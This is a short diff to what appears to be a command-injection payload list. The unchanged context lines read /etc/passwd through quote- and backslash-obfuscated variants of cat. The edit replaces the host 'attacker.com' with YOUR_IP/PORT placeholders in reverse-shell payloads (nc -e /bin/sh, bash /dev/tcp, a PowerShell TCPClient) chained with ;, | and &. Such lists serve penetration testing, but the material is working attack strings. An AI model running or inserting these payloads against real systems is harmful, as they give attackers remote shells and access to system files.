@@ -74,7 +74,7 @@ c'a't /etc/passwd
 c"a"t /etc/passwd
 c\at /etc/passwd
 
-# Reverse shell payloads (for testing only)
-; nc -e /bin/sh attacker.com 4444
-| bash -i >& /dev/tcp/attacker.com/4444 0>&1
-& powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('attacker.com',4444);"
+# Reverse shell payloads (for authorized testing only - replace YOUR_IP and PORT)
+; nc -e /bin/sh YOUR_IP PORT
+| bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1
+& powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('YOUR_IP',PORT);"
